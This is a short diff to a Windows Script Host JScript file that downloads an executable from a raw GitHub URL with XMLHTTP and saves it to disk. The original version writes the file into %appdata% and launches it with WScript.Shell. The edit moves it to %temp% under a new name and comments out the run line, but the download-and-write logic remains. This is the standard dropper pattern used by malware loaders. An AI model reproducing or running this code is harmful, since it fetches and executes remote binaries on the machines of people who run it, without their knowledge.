@@ -1,12 +1,11 @@
 var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/test.exe";
-var Target = "%appdata%\\test.exe";
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 Object.Open('GET', Source, false);
 Object.Send();
 var r = new ActiveXObject("WScript.Shell");
-var appdata = r.ExpandEnvironmentStrings("%appdata%");
-Target = appdata + "\\test.exe"
+var appdata = r.ExpandEnvironmentStrings("%temp%");
+Target = appdata + "\\hello.exe"
 if (Object.Status == 200)
 {
     // Create the Data Stream
@@ -28,5 +27,5 @@ if (Object.Status == 200)
     // Write the Data Stream to the File
     Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
     Stream.Close();
-    r.Run(Target);
+    //r.Run(Target);
 }
